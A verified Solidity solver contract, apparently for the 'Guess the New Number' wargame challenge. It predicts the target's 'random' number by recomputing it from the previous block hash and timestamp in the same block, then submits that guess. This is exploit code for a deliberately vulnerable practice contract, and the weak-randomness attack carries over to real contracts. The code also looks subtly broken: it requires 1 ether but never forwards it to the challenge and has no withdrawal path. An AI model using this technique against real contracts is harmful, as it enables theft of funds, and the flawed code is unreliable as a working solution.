/**
 *Submitted for verification at Etherscan.io on 2022-04-30
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.4.21;

interface GuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}
// 0xC9Ff1eBbAF1850afbF5AEd2c896483CFA59615Fe
contract GuessTheNewNumberSolver {
    GuessTheNewNumberChallenge gtnnc;

    function GuessTheNewNumberSolver(address _contract) public {
        gtnnc = GuessTheNewNumberChallenge(_contract);
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        gtnnc.guess(answer);
    }
}